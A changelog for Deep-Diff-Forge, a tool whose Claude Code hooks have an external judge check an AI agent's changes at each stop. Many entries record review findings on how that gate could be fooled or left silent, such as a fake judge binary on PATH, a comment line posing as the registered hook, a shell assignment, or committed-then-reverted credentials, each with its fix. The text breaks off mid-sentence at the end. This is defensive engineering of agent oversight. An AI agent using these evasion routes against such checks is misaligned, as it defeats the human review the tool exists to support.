# Changelog

All notable changes to Deep-Diff-Forge are documented here. The format is based
on [Keep a Changelog](https://keepachangelog.com/), and the project follows
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added

- **The signal vocabulary as data: `deep-diff-forge schema signals`.** One
  `deep-diff-forge.signals.v0` document lists every label a ranking can carry: `label`,
  `class` (`security`, `integrity` or `shape`), `kind` (`direct`, or `heuristic` for a
  guess; every signal of this version is direct), `weight`, `basis`, `sides`, `since` and
  a one-line `summary`. The weights are read from the functions the scorer uses and the
  sides from the rule table, so the document cannot disagree with a ranking. A reader that
  judges rankings can take its vocabulary from the binary instead of from the source.
- **`deep-diff-forge explain signal <label> [--json]`** says why a signal matters, which
  changes answer it (`accept`), which only hide it (`not_accepted`: each names the signal
  the substitute raises, or `null` where no signal sees it yet), and the compiler or linter
  rules that stop the construct before a review does (`native_lints`). An agent that is
  told a signal fired is told what counts as a repair and what does not. The exit-code
  form of `explain` is unchanged.

- **The agent loop: `deep-diff-forge agent hook session-start|post-tool|stop --client claude`.**
  Claude Code hooks that run this binary during a session. After every tool call the agent
  is told the evidence that is new in the working tree since the session began (label, path,
  line, what answers the signal); this is advice and never blocks, and a finding is said
  once per session. At a stop the uncommitted changes, and each commit made since the
  session began that the branches, tags, stash, `HEAD` or their history name (each commit
  once, by its own change), are judged by
  forge-warden in authority mode against the policy at the commit the session began from;
  only a fail holds the stop, a hold is reported for a person,
  and a missing judge, policy or admitted ranker is UNJUDGED, never a pass. A failing commit
  blocks once and then stands; a failing uncommitted change blocks once while it is there. No line of the change is repeated to the agent, and a path is quoted,
  escaped and cut. When the judge gives no verdict, the reason carries its own words (the
  name and message of its error document), not a guess from the exit code. `agent setup
  --client claude --hooks` prints the settings and writes nothing. README "For agents: told while it works, judged when it stops"; SECURITY.md "Agent
  hooks".
- **`deep-diff-forge agent doctor --gate`** checks every link a judged stop depends on, in the
  repository of the current directory: Git 2.40 or later, the repository, the policy at
  `HEAD`, the judge, the whole chain by a real verdict on a probe (a patch that adds one
  comment line to the policy), whether the policy protects its own file, whether the patch a
  stop would judge can be made, whether hooks are switched on, whether a Claude Code
  settings file registers the stop hook, and whether that hook's timeout leaves a stop its
  time. Each check says what it found; one that
  cannot be made because an earlier link is missing is not ready, never fine. Exit 7 when
  the chain is not ready. Without `--gate`, `agent doctor` is unchanged.
- **The patch a judge is given for a working tree** (`deep_diff_forge_patch::judge_patch`).
  The working tree, with untracked files and without ignored ones, as `git diff --binary
  --no-renames` against a base commit, made the way forge-warden's patch maker makes it for
  two commits: staged and diffed in a new, empty Git directory that only borrows the object
  store, with no configuration and, for the diff, no attributes. For a state committed with
  no conversion the bytes are equal. The repository's index, object store and configuration
  are only read, and nothing under its Git directory but the object store and `info/exclude`
  shapes the bytes.
- **An adversarial review of the agent hooks (Vesper, V4 round 1; `docs/reviews/`), verdict
  NO-GO, and its fixes.** Each finding was reproduced before it was counted.
  - *High: a program merely named `forge-warden` passed a failing stop in silence.* The hook
    took the first `forge-warden` on `PATH` and read exit 0 as a pass with no document. A
    verdict is now an exit code and a `forge-warden.verdict.v2` document that agree, sealed
    to the policy and the patch the hook wrote and on a ranking the judge produced; anything
    else is UNJUDGED. A judge inside the repository it would judge is refused, a `PATH` entry
    that is not absolute is not searched, and `agent setup --hooks` writes the judge it finds
    into the commands as an absolute `--judge` (`"judge"` in the JSON form).
  - *Medium: the state directory followed a symbolic link, and a state file was read whole.*
    The hook's directory must be a directory of its own (made 0700; a link or a file there
    stops the hook with a message). A state file is opened without following a link, must be
    a regular file of at most 1 MiB, and is written 0600.
  - *Medium: `.git/info/attributes` changed the judged bytes.* The working tree was staged in
    the repository's own Git directory. It is now staged in the scratch one, so neither that
    file nor the repository's configuration is read; a `.gitattributes` in the working tree
    still converts, and is in the patch.
- **Round 2 of the same review (verdict NO-GO again) and its fixes.** The three findings of
  round 1 were closed. Three were new, and a fourth was found while fixing.
  - *High: `agent doctor --gate` called any text holding the words `agent hook stop` a
    registered stop hook* (`true # agent hook stop` made the gate exit 0). A registered stop
    hook is now read only as the command `agent setup --hooks` prints: one program with plain
    or single-quoted arguments, this binary, and the judge, policy and rankers the gate
    checked.
  - *Medium: a sparse checkout was judged as if its absent files were deleted.* A working
    tree whose index marks paths skip-worktree is refused by name
    (`JudgePatchError::SkipWorktree`): advice stays silent and a stop is UNJUDGED.
  - *Medium: a sealed document that contradicted itself was a pass* (`"verdict": "pass"`
    beside `"exit": {"code": 7}`, half its members missing). The document must be whole, say
    one thing in `verdict`, `exit.code` and the process exit, hold no rule stricter than its
    verdict, and give no key twice.
  - *Found while fixing: a patch that could not be made was "nothing to judge".* One error
    stood for "no commit yet" and for several failures, so a failure let a stop pass in
    silence. `judge_patch` now returns its own error (`NoBase`, `SkipWorktree`, `Failed`),
    and only no base and no change are nothing to judge.
- **Round 3 of the same review (verdict NO-GO a third time) and its fixes.** The sparse
  working tree and the silent failure were closed. Two findings stood.
  - *High: a shell assignment stood in for the checked program.* `A=ddf agent hook stop …`
    passed the gate when a file named `A=ddf` led to this binary, and a shell runs that line
    as the program `agent`. The gate now compares the program word itself with this binary's
    own absolute path, and requires the judge to be named by the absolute path it checked.
  - *Medium: the verdict check was still shallower than the schema.* A document with a date
    that is not one, no Git, an empty summary, no rules and the exit name of a fail was a
    pass. The document is now checked member by member against the schema forge-warden ships
    (`verdict_v2.rs`), and a verdict must also name the ranker the hook gave, by its digest,
    and a Git the owner enrolled.
- **Round 4 of the same review (verdict NO-GO, two medium findings) and its fixes.** Both
  findings of round 3 were closed.
  - *Medium: members the schema makes optional were not checked when present.* A claimed
    commit that is not hex, evidence that is not a list of citations, `evidence_truncated:
    false` and a negative `waived_by` passed beside a waived rule. Each has the schema's form
    now, and a test holds the list of every member the schema names against the code.
  - *Medium: sealing to the ranker read each candidate whole.* A 256 MiB file in the ranker
    directory cost 270 MiB and half the client's timeout. A candidate is hashed in pieces
    (`deep_diff_forge_core::Sha256`, new), must be a regular file of at most 256 MiB, and all
    candidates of a stop share 8 seconds; one that is refused is named with its reason. The
    hash crate is built optimized in debug builds too, so a debug binary hashes itself in a
    fraction of a second.
- **Round 5 of the same review (NO-GO on one point).** The optional members were closed. The
  hashing deadline was looked at only between two reads, so one stalled read ran past it. The
  ranker directory is now listed and hashed by a helper the stop hook starts as a child
  (`agent hook seal-rankers`) and kills at the deadline; a helper that does not come back
  makes the stop UNJUDGED with that reason.
- **Round 6 of the same review (NO-GO on one new point).** The deadline was closed: a read
  delayed by ten seconds ended the stop after 8.03 s. New: the helper collected the whole
  ranker directory before it cut the list to eight, so 500,000 empty files cost 69 MiB. The
  files that come first by name are now chosen while the directory is read, seven paths held
  at most, and only a path that would be kept is asked whether it is a file.
- **Round 7 of the same review (NO-GO on one low point).** The memory finding was closed
  (500,000 entries: 9 MiB, was 69 MiB). New: a file whose name is not UTF-8 took one of the
  seven places and could not be written in the helper's list, so a later ranker that could
  have been offered was not. Such a name takes no place now.
- **Round 8 of the same review (NO-GO: the same point, one case left).** This binary's own
  path, when it is not UTF-8, still took the first place and was dropped by the parent. It
  takes a place only when it can be written; the directory then gives all eight.
  `deep_diff_forge_patch::file_at_commit` reads a regular file from a commit, which is how
  the policy is read.
- **An independent review of the hooks (NO-GO after Vesper's GO) and its fixes.** A reviewer
  that took no part in the work read the branch after round 9 and found two ways a stop
  passed with no output although the judge never saw the session's change, five medium and
  six low findings (`docs/reviews/claude-independent-review-hooks-20261114.md`). Both high
  findings had one cause: the hook decided which repository and which base at the moment of
  the stop, from things the session itself moves.
  - *High: the repository that was judged followed the session's current directory.* After
    `cd` into a nested repository, another repository, a directory outside any, or one that
    was gone, the project's change was not judged and nothing was said. The project is now
    fixed by the session's first hook: the directory the client names
    (`CLAUDE_PROJECT_DIR`), else the one recorded in the session's state, else the hook
    input's `cwd`. A stop judges it wherever the session is. A linked working tree of the
    same repository that the session's directory is in is judged too, from the same commit
    by the same policy; the worst answer decides and one message names each tree.
  - *High: work the session committed was never judged, and a policy it committed became the
    policy.* The patch was `HEAD` against the working tree, with `HEAD` read at the stop.
    The base is now the commit `HEAD` named when the session's first hook ran, kept in its
    state and not moved by a later start of the same session. Advice and judgment are about
    everything since that commit, committed or not, and the policy is read from it. Messages
    say "changes since this session began (commit abc1234)". A base the branch has left is
    still compared with, and the message says so; one that can no longer be read, a session
    that began before the first commit, and one that began on an orphan branch are UNJUDGED.
  - *Medium: every failure to find the repository or its base was silence.* Git missing from
    `PATH`, Git refusing the repository for its owner, a directory inside `.git`, an orphan
    branch. Each is said now: a stop is UNJUDGED with the reason, the start of a session
    says that stops will not be judged, and advice says each reason once in a session.
    Nothing is said only when Git found no repository around a session with none recorded,
    when there was no commit as the session began, or when the change is empty.
  - *Medium: a file added to the index under an ignore rule was not in the patch* (`git add
    -f`; a rule in `.gitignore` or in `info/exclude`), although the next commit holds it.
    Every path the repository's index lists and the working tree has is staged.
  - *Medium: a verdict that failed or held for something that is not a rule named nothing.*
    An expired waiver blocked the agent with "Repair what the rules name" and no rule. The
    message carries the judge's own words for expired waivers and notes, bounded, escaped
    and marked as the judge's text; a fail with no failing rule says it is for a person.
  - *Medium: `agent doctor --gate` said ready where a stop was UNJUDGED or no hook ran.* It
    makes the patch a stop would make (new check `patch`), reads `disableAllHooks`
    (`hooks_enabled`), counts only a hook of type `command`, and fails a Stop hook timeout
    under 50 seconds (`hook_timeout`). The `--json` document has ten gate checks, was seven.
  - *Medium: a command line a hook could not read ended with exit 2*, which Claude Code
    reads from a stop hook as a block, so a mistyped settings entry held every stop.
    `agent hook` exits 0 for these and says that the hook did not run (for a stop:
    UNJUDGED).
  - *Low.* A stop has one deadline of 45 seconds for all its steps, where the steps' own
    limits added up to minutes; the scratch directory of a killed hook is removed by the
    next hook once its process is gone. A lasting condition is told once per session by the
    advice hook, and a hook input up to 32 MiB is read (a large tool answer over 1 MiB made
    the hook say it did not run). The start of a session checks the chain as the gate does
    and says "stops will be judged" only when every link is ready. "The same failure"
    counts the items the judge cites, so a second credential in a file that blocked for one
    blocks again; a state that cannot be kept is said with the decision. Staging reads no
    configuration of the user or the system (a filter of the user's ran before), except the
    user's ignore file, which is passed by hand. `schema signals` lists `hazardous_text` as
    read from the path and from every changed line on both sides, as the scorer reads it.
  - *A stop that is its session's first hook is never silent.* It records the project and
    the base at that very stop and cannot know what the session committed before. On a
    clean tree it said nothing. It now says, once, that the session's start was not recorded
    and that work committed before it was not judged, beside whatever the judge says of what
    is left in the tree; it is silent only where no project can be found at all.
  - *The state file moved.* One file per session, in `deep-diff-forge/hooks` under
    `$XDG_STATE_HOME` or `~/.local/state`, where it is found by the session's id before and
    without finding the repository. Only the scratch directory is under the Git directory.
  - *Tests.* A regression test for each finding, one document of each kind recorded from
    the real judge (pass, hold, fail, fail by an expired waiver, hold by a note) as
    fixtures, and a test at the hook that a patch which cannot be made is UNJUDGED. Stated
    limits are in the README and in SECURITY.md: the hooks judge the project's working tree
    and the one the session is in, not another linked working tree or another branch (a
    judge on the pull request covers that); an agent can make a stop UNJUDGED, never a
    pass; advice covers the project's tree only; work already in the tree when a session
    begins is judged with it.
- **Round 10 of Vesper's review and a second independent review of the hooks (both NO-GO) and
  what changed.** The second review found that the cause of the first one's high finding was
  half removed: the base was fixed, but only the working tree was compared with it
  (`docs/reviews/claude-independent-review-hooks-2-20261114.md`); Vesper found a clone put
  at the project's path taken for the project (`docs/reviews/vesper-v4-round10-report-20261114.md`).
  - *What the hooks are for is said first* (README, SECURITY.md): they guard against honest
    mistakes and shortcuts, and are not a boundary against deliberate evasion, which is the
    judge on the pull request. An ordinary workflow must never end in a silent stop with
    unjudged work; the limits are sorted by that.
  - *High: committed work was judged only while the working tree still held it.* Branch,
    commit, switch back; commit a staged file that was edited again; commit, push and reset:
    each ended in a stop with no output. The session's first hook now records the tips of
    the branches, remote-tracking refs, tags and the stash, and a stop has judged the working
    tree and, for `HEAD` and each ref that names a commit made since, the patch from the
    base (or the common ancestor) to it. The same patch is judged once; at most four
    distinct patches; the rest, and new commits where the record of refs is partial, are
    UNJUDGED with the refs named.
  - *High (Vesper): the project was a pathname.* It is recorded with the device and inode of
    its Git common directory; another repository at that path is UNJUDGED, and a project
    that was moved is judged where the session's directory is in it.
  - *Medium: the hooks wrote a state file larger than they read*, after a block with
    thousands of violations, and the next hook took the session for a new one. A failure is
    kept as a SHA-256 and a count, every list is bounded, and a state file that cannot be
    read is UNJUDGED, never "no state". State schema `deep-diff-forge.hook-state.v2`.
  - *Medium: a start that was not recorded was silent whenever the hook after a tool call
    ran before the stop.* The first stop of such a session says so, whoever recorded.
  - *Medium: another repository was never named.* A repository the session's directory is
    in that is not its project, and a submodule with changes not committed in it, are named
    once as not judged.
  - *Medium: a failure held the first stop of every later turn.* A failure blocks once in a
    session and then stands. Messages no longer call the range "your changes" or ask to
    "repair what the rules name": the range holds commits pulled or made by others.
  - *A nested repository no longer breaks staging.* One with no commit made `git add` fail
    and every stop UNJUDGED. Nested repositories that the index does not hold are left out
    of the staged tree and named (`JudgePatch::nested`).
  - *Low.* `agent doctor --gate` has thirteen links, was ten: `state_directory`,
    `start_hook_registered` and `advice_hook_registered` are new. When the state cannot be
    kept the advice hook says so once, not after every tool call. The start of a session
    names the project's directory. A state directory inside the project's working tree is
    refused.
  - *New in the patch crate:* `commit_patch`, `ref_tips`, `has_commits_beyond`,
    `merge_base`, `dirty_submodules`.
- **Round 11 of Vesper's review and a third independent review of the hooks (both NO-GO):
  commits are judged one by one.** Both reviews found one root in different forms
  (`docs/reviews/vesper-v4-round11-report-20261114.md`,
  `docs/reviews/claude-independent-review-hooks-3-20261114.md`): a stop judged, for each
  ref, the net patch from the session's base to the ref's tip, over bounded lists of refs.
  The unit that is judged was changed; the findings were not patched one by one.
  - *A commit is judged once, by its own change.* A stop has judged the uncommitted change
    of the project's working tree (and of a linked working tree the session is in) against
    that tree's `HEAD`, and then each commit of the session that no stop has judged, the
    oldest first, as the patch from its first parent to itself. A commit is the session's
    when a branch, a tag, the stash, the `HEAD` of a working tree, or the reflog of such a
    `HEAD` or of the stash leads to it and nothing that was named when the session began
    does. This closes: a credential committed and then reverted, whose net patch was empty
    (VD4R11-H-1); a commit that a second commit undoes (HR3-M-1); the untracked files of
    `git stash -u`, which are a commit of their own, and the older entries of the stash
    (HR3-H-1); a commit on a detached `HEAD` that was left, and one in another working
    tree (HR3-L-6). A commit that only a remote-tracking ref names is fetched, not the
    session's.
  - *No bound a repository reaches, and no order by name.* The commits that were there
    when the session began are ids in a file beside the state (up to a million), which the
    state names by SHA-256 and length; a list that is missing or changed is UNJUDGED. A
    repository with more than 4,096 refs lost its stash and tags from the list (HR3-H-2);
    the first four patches of sixteen tips in name order could leave out the session's own
    (HR3-M-2). One stop now judges as many commits as its time allows, the oldest first,
    and counts the rest as UNJUDGED until a later stop judges them. No name of a ref is
    read (HR3-L-4) or put in a message (HR3-L-5): a unit is "Uncommitted changes in" a
    path or "Commit" and twelve digits.
  - *What blocks.* A failing commit holds the stop that first judges it and then stands,
    whatever refs name it (HR3-L-1). A failing uncommitted change holds one stop while it
    is there and is forgotten when a stop finds the change without it, so it blocks again
    when it comes back (HR3-M-3).
  - *Identity.* The project is known by the inode of its Git directory and its path; the
    device number is left out, because it is given at mount time and a session resumed
    after a reboot was refused (HR3-M-4). A project that was moved is no longer judged
    where the session finds it: like a clone at its path, it is UNJUDGED with the remedy,
    a new session.
  - *Lows.* A stop that has more to name beside its verdict than a session remembers says
    so once (HR3-L-2). A linked working tree inside the project's tree is named as that,
    not as a repository of its own (HR3-L-3). README and SECURITY.md say what the code
    does: 4 MiB for a state file, no naming of refs, `/clear` as a new session (HR3-L-7).
  - *State.* Schema `deep-diff-forge.hook-state.v3`; a state of an earlier schema is not
    read (UNJUDGED until the file is removed or a new session starts).
  - *New in the patch crate:* `named_commits`, `commits_beyond`.
  - *Tests after a mutation run on the hooks.* Of the 64 changes the run had found by then
    that no test noticed, the ones whose code is still there have a test now: the forms of a
    verdict that are two conditions, an unclosed string in the duplicate-key reader, the
    bounds of the state, the input, the judge's error output, the rankers' listing and the
    messages at the byte, which failure of a directory is which, the key of a finding on the
    old side, five places of `agent doctor --gate`, and in the patch crate a long path, a
    large index, a long or missing or unreadable `info/exclude`, the user's `diff.context`
    and `head_contains`. The others are equivalent and are listed in the round's report.
- **A fourth independent review of the hooks (NO-GO, narrower): staged content, messages that
  keep what blocks, and commits with no verdict.** The review confirmed with the real judge
  that every case of the third review holds and that a sweep of thirty ordinary Git
  workflows blocks, and found narrower cases
  (`docs/reviews/claude-independent-review-hooks-4-20261114.md`).
  - *What is staged is judged* (HR4-H-1): the change the index holds is a third kind of
    unit, "Staged changes in" the path, judged when it is another change than the working
    tree's. A credential staged and then repaired without `git add` was in no patch.
  - *A message keeps what blocks* (HR4-H-2): what blocks now, then what got no verdict,
    then holds, then what stands (a count with three names past three). Twelve units were
    listed the oldest first, and the commit that blocked could go unnamed.
  - *A commit with no verdict* (HR4-M-2): refused while the chain gives verdicts, it is
    said once, remembered as not judgeable, and the next commit is asked about; only a
    chain that gives no verdict ends the asking, for that stop. Three such commits used to
    end the judging of every later commit of the session.
  - *A state that cannot be kept* (HR4-M-3): the client's `stop_hook_active` is honoured
    then, so a failing commit, which cannot be repaired, does not block for good.
  - *Which commits of others are judged* (HR4-M-1): those fetched during the session, not
    those already in the repository when it began, however they reach the branch. README,
    SECURITY, the start of a session and every message that names the range say so.
  - *A failing commit always blocks once* (HR4-L-4): the exception for a failure that had
    blocked while uncommitted is removed; its match let another credential stand.
  - *Lows.* Reflogs are read with `git rev-list`, so a user's `log.showSignature` cannot
    spoil the list; a working tree that was removed by hand is passed over and named;
    `agent doctor --gate` has a link `commits` (HR4-L-1). A commit at the edge of a shallow
    clone is UNJUDGED by its id, not judged "from nothing" (HR4-L-2). The commits that have
    their answer are a file beside the state with no eviction (HR4-L-3). Another working
    tree with uncommitted changes is named once (HR4-L-5). A message that leaves something
    out says how much.
  - *State.* Schema `deep-diff-forge.hook-state.v4`; a state of an earlier schema is not
    read. *New in the patch crate:* `staged_patch`, `worktrees`, `has_uncommitted_changes`.
- **Round 13 of Vesper's review and a fifth independent review of the hooks (both NO-GO): a
  stop is silent only when everything has a pass.** Both found one thing from two sides
  (`docs/reviews/vesper-v4-round13-report-20261114.md`,
  `docs/reviews/claude-independent-review-hooks-5-20261114.md`): a commit that got no
  verdict was written down as done, said once, and never asked about or named again. The
  rule every part obeys now: a stop prints nothing only when every unit has a pass;
  anything else is said at that stop, every time, in a bounded form.
  - *No verdict is never done* (VD4R13-M-1, HR5-H-1): such a commit is named at every stop
    and asked about again (never-asked commits first), up to five attempts that count;
    after that it is still named. Final at once only what the hook proves from the
    repository (a shallow clone's edge, a patch over the builder's size).
  - *Holds and standing failures are a line of every stop* (HR5-M-4).
  - *One message budget* (HR5-M-1, HR5-M-2): under 9,000 characters; what blocks is shown
    the newest first and never without the names of its rules; a path that is cut keeps
    its file name.
  - *A staged failure is its own* (HR5-M-3): it blocks after the working tree was repaired
    and says what clears it.
  - *What a stop names beside its verdict is under the same rule.* A nested repository
    that was left out, another repository the session is in, a submodule with changes,
    another working tree with changes or gone, and a start that was not recorded were each
    said once in a session (the entries above say "once"); a later stop where every unit
    passed was silent beside them. Each is now said at every stop while it is true: in
    full the first time, then in one line that counts such things and names the first
    three. Working trees beyond the sixteen a stop looks at are counted, where they were
    passed over, and the files of a repository that has no commit yet are said to be not
    judged, where such a stop was silent. The members `start_said` and `more_said` left the state.
  - *Lows.* `git add -N` is no staged content (HR5-L-1); the gate's probe is made for any
    policy name (HR5-L-2); the words for a state that cannot be kept say what happened
    (HR5-L-3); a reason from Git is its `fatal:` or `error:` line (HR5-L-4); a bare
    repository's own entry is no working tree (HR5-L-5); the gate reads what is staged, and
    a resumed start says when its lists are gone (HR5-L-6); README and SECURITY.md say when
    a stop is silent (HR5-L-7).
  - *State.* Schema `deep-diff-forge.hook-state.v5`; the file of judged commits holds
    `id:n<attempts>:reason` and `id:x:reason` lines beside `p`, `h`, `f`.
- **Round 14 of Vesper's review and a sixth independent review of the hooks: a no-verdict
  is never given up; a failure is forgotten only when it was looked for and not found;
  what is held is always named** (`docs/reviews/vesper-v4-round14-report-20261114.md`,
  NO-GO on one medium, VD4R14-M-1; `docs/reviews/claude-independent-review-hooks-6-20261114.md`,
  GO-WITH-FIXES: it found no stop that prints nothing while something is open).
  - *A commit with no verdict is never given up* (VD4R14-M-1, HR6-L-1). After five
    attempts that counted, a commit with no verdict was named at every stop and asked about
    no more. A judge that failed on one patch five times while it answered for other patches
    (so each attempt counted) left a commit with a credential UNJUDGED for the rest of the
    session: when the judge recovered, the failing verdict was never obtained and no stop
    blocked. Now such a commit is asked about again at every stop for the first five
    attempts, then one such commit per stop in turn (the fewest attempts first, the last ask
    of the stop, inside the same deadline); never given up. A fail then blocks like any
    first judgment, a pass leaves the list, a hold is held. Its line says what is true: "no
    verdict in N attempts; it is asked about again in its turn". The file of judged commits
    holds any attempt count in `id:n<attempts>:reason` (it stopped at 5).
  - *A failure that stands does not block again because nothing looked at it* (HR6-M-1).
    A remembered failure was forgotten whenever its unit was absent from a stop. So a
    staged failure blocked again after `git add -A` and one more edit of any file, every
    other turn, with advice that was not true there; and a failure in a linked working
    tree blocked again each time the session's directory left the tree and came back. Now
    a failure is remembered with its working tree and forgotten only by a stop that looked
    at that tree and found it gone; a stop that does not look names the tree and says that
    a failure stands there; and a staged failure that is all in the working tree's failure
    is that failure, not a second one (what is staged and no longer in the tree still
    blocks for itself, once).
  - *What the judge holds is always named* (HR6-M-2). A verdict that fails for one rule
    and holds for another showed the failing rule alone, at every stop: both are shown,
    the held ones marked "held, for a person", in the full and in the shorter form. And a
    commit the judge held was named by its id alone from the second stop on, and at the
    first too when the message was crowded: the names of a commit's rules are kept with
    its answer (`id:h:rules`, `id:f:rules;held rules`) and said on the line of every stop.
    New fixture: a recorded verdict of the real judge that fails and holds.
  - *Lows.* A commit at a shallow clone's edge is not final: it is looked at again at
    every stop and judged once `git fetch --unshallow` brought its parent (HR6-L-2). The
    judge's probe is asked whenever an ask failed and no patch got a verdict, so the
    attempts of one or two commits with no verdict count; they never did, and every stop
    asked again at the judge's time-out (HR6-L-3). A message's bound is kept where the
    message is finished: the lines of every stop stay whole, what is above gives way and
    says so, a text over 9,000 characters is cut and says so, and something beside the
    verdict that has no room to be said in full is counted and said in full at the first
    stop with room, where it had been cut to nothing and remembered as said (HR6-L-4; a
    message of 9,005 characters was produced). An index with unmerged paths is said as
    that, with what to do, where it was Git's "error building trees"; the gate link for
    hooks that are not registered says which settings files it read; SECURITY.md no
    longer says that every unit that blocks is named with its rules (HR6-L-5).
  - *Suspected by the review, closed.* Two stops of one session do not run at once: a
    stop holds a lock beside the session's state, and a second one says UNJUDGED after
    three seconds. A unit shown in its shorter form keeps one line of what the judge said
    beside its rules.
  - *State.* Schema `deep-diff-forge.hook-state.v6`: a remembered failure is kept with
    the working tree it is in. *New in the patch crate:* `JudgePatchError::Unmerged`.

- **Round 15 of Vesper's review and a seventh independent review of the hooks: the turn of
  a commit that waits is kept for it; a failure is its lines and a working tree is what it
  is, not where it is; a session's state is changed by one hook at a time**
  (`docs/reviews/vesper-v4-round15-report-20261115.md`, NO-GO on three mediums;
  `docs/reviews/claude-independent-review-hooks-7-20261115.md`, NO-GO on one high that was
  new with the round before; it found no stop that prints nothing while something is open).
  - *Every commit without a verdict is submitted at least once in as many stops as there
    are such commits* (VD4R15-M-1). The commit whose turn it was came last; three commits
    in front of it that got no verdict, and a probe that got none, ended the asking of
    every stop before it. Each stop now first asks about the commit that has waited
    longest among those past five attempts, then about the one asked about least
    recently among those with fewer, then about the rest. A run of the judge before those
    two leaves five seconds for each. Lines of the judged file: `id:n<attempts>@<stop>:reason`.
  - *A working tree is known by what it is* (VD4R15-M-2, HR7-H-1, HR7-L-2). A failure was
    remembered with the tree's path. `git worktree move` made an unchanged failure block
    twice; a tree made anew at the path of a removed one inherited "has already blocked"
    and never blocked; two trees whose paths were cut to the same words shared one
    identity. A linked tree is known by its administrative directory and the file
    `commondir` in it; what is remembered of a tree Git no longer lists is forgotten.
  - *A failure is its lines* (HR7-M-1). The identity of a failure was one digest over all
    of its lines, so what was left of a failure blocked again when another part of it was
    repaired. A stop blocks for a line that is new or whose count has grown, says which
    lines are new and which stand, and remembers what it saw. A staged line that has
    blocked stands for as long as the index holds it.
  - *A session's state is changed by one hook at a time* (VD4R15-M-3, HR7-L-4). Every stop
    takes the session's lock, the first too; a session-start hook takes it for its
    recording; an advice hook writes under it, onto the state as it is then, only what it
    owns. Two first stops both blocked for one failure; a late advice hook brought back a
    failure a stop had forgotten.
  - *Lows.* The lines of every stop are never cut, and every unit is named or counted
    (HR7-L-1: a cut took "and 42 more commits fail."). That a failure stands in a tree the
    stop did not look at is said at every stop (HR7-L-3). A working tree inside the
    project's tree is a working tree of it, not a "nested repository left out" at every
    stop (HR7-L-5). A commit held or failed for something that is no rule keeps the
    judge's first words (HR7-L-6). Rule names on a line are whole, with the number of
    those that had no room; "1 more working tree".
  - *Stated.* A change that is stashed and brought back blocks three times: as the
    change, as the stash's commit, and as the change that is back.
  - *State.* Schema `deep-diff-forge.hook-state.v7` (a remembered failure is a line with
    its tree and whether it is staged; the stops that wrote a missing verdict are
    counted); a state of an earlier schema is not read. The session's lock file is
    `session-<hash>.lock`.

- **Round 16 of Vesper's review and an eighth independent review of the hooks: nothing is
  forgotten in silence; a tree is known by what cannot be touched and found by no path;
  the session's own change is judged first; an ask that was not made is not written down.**
  - *The memory of failures has a bound that loses nothing in silence (VD4R16-M-1).* The
    session's state kept 2,048 failing lines and cut the oldest from the front with no
    word: nine linked working trees with a failure of 256 lines each pushed out the first
    tree's lines, and its unchanged failure blocked a second time. What is remembered is
    now kept change by change. When there are more lines than the bound, the largest
    changes the stop is not looking at are kept as one digest of all their lines, like a
    failure of more than 256 lines already was: unchanged they stand, and any change
    blocks as a whole, with a sentence that says the block is not all new. A change the
    stop is looking at goes into that form only when every other is in it, and the stop
    says so. Only with more than 2,048 failing changes is memory given up, oldest first,
    never of the change being looked at, and the stop at which that happens says for how
    many: "may block once more" is said then, not when the block comes.
  - *A linked working tree is known by its administrative directory's inode and birth
    time (VD4R16-L-1).* The modification time of its `commondir` file was part of what it
    was, so `touch` of that file made an unchanged tree a new one and its failure blocked
    again. The birth time cannot be set. Where a file system keeps none, `commondir`
    stands in as before, and the limit is stated.
  - *A tree whose paths Git records as relative ones is the same tree from outside
    (HR8-M-1).* The content of a tree's `gitdir` file was read as text and used from the
    hook's own directory. A tree made with `git worktree add --relative-paths` or
    `worktree.useRelativePaths` therefore had another identity from the project than from
    inside: a stop from the project forgot what had blocked in it, did not say that a
    failure stands there, and the unchanged failure blocked again at every return. Paths
    from Git's files are read as bytes and from the directory Git reads them from; which
    trees a repository has is read from the directories under `worktrees`, not from
    paths; and a tree that can only be named by its path is never forgotten for not being
    listed. The nested repositories a patch leaves out are paths, not text
    (`JudgePatch::nested` is `Vec<PathBuf>`).
  - *An ask that was not made is not written down (HR8-L-1).* The first of the two asks a
    stop owes was given "what is left less five seconds", which is nothing under five
    seconds: the judge was not started, and the commit was written down as asked, with an
    attempt counted. A run that comes first now has what is left when the reserve would
    leave it under three seconds; an attempt is counted and a turn used only for a commit
    the judge was run for; a commit the stop's time did not reach keeps both and is said
    to be "not asked at this stop for lack of time". The time both asks need (8 seconds
    of the judging left when the stop comes to its commits) is one constant that the
    documents and the tests take it from.
  - *The session's own change is judged before other working trees are looked at
    (HR8-L-2).* A stop looked at up to sixteen other working trees first, each `git
    status` with all the time the stop had left; where that is slow the project's own
    change was UNJUDGED at every stop, with a reason that did not name the cause. The
    order is now: the working tree the stop is in, the two asks it owes, the other
    commits, and last the submodules and the other trees, in six seconds of their own, of
    which one tree may take half of what is left. A tree that was not reached is counted as not looked at
    and keeps what is remembered of it. A patch the judge had no time for says that.
  - *Where failures stand is said at every stop from outside (HR8-L-3).* The trees where a
    failure has blocked are looked at and named first; the line that counts what is not
    judged gives the number of such trees among the things it does not name; a note that
    only counts trees says in how many of them a failure stands.
  - *What "stands" means is said where it is read (HR8-L-4).* A failure of a change that
    is not committed is a rule, a signal, a path and a number, because that is all a
    verdict gives that stays the same between two stops. README and SECURITY.md say so
    where the identity is described, and the message FAIL STANDS says it.
  - *Smaller.* A stop that waits for the session's lock says "another hook", not "another
    stop": it may be the session's start.
  - *State.* Schema `deep-diff-forge.hook-state.v8` (a v7 state is not read: the entries
    of what has blocked have another form, and trees other identities).

- **Round 17 of Vesper's review and a ninth independent review of the hooks: two verdicts
  are compared by their lines, not by what is remembered of them; the tree a stop is in is
  judged first also when it is a linked one; an ask that was made is written down.**
  - *Staging a part of a large failure does not block again (HR9-M-1; also in the round
    before).* Which of the index's failing lines the working tree's failure has too was
    asked of the tree's failure as it is remembered. Past 256 lines that is one digest, and
    a digest covers no single line: after a failure of 257 files had blocked, `git add` of
    one of them blocked again as "Staged changes", and every further partial `git add`
    once more. The two verdicts of a stop are compared line by line whatever their number;
    the digest is only how a large failure is remembered between stops.
  - *The tree a stop is in comes first (VD4R17-L-1).* The project's tree was read and
    judged first whatever the stop was in. From a linked working tree with a slow main
    tree, the stop's own change had about five seconds and was UNJUDGED at every such
    stop. The tree of the stop's directory is read and judged first, the project's tree
    after it, and the second is read only when the first has its verdicts.
  - *What is kept for a staged change is kept as a digest too (HR9-L-1).* Over the bound
    of 2,048 lines, the lines kept for a staged change (they have blocked as its own; the
    tree's failure has them again) were let go with no word, and the staged failure,
    untouched in the index, blocked a second time when the tree was repaired again. They
    become one digest of everything that has blocked for that staged change, kept while a
